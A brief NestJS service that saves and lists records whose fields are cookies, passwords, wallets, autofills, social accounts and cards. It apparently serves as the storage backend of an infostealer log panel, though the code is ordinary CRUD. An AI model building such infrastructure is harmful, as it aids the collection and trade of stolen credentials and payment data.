import { Injectable } from '@nestjs/common';
import { InjectRepository } from '@nestjs/typeorm';
import { Repository } from 'typeorm';
import { Set } from './app.entity';

@Injectable()
export class AppService {
  constructor(@InjectRepository(Set) private readonly appRepository: Repository<Set>) {}

  async create(dto: {
    id: number, 
    total: string,
    cookies: string, 
    passwords: string, 
    wallets: string,  
    autofills: string,
    social: string,
    cards: string,
    date: string
  }) {
    const set = this.appRepository.create(dto)
    return await this.appRepository.save(set)
  }

  findMany() {
     return this.appRepository.find()
  }

}
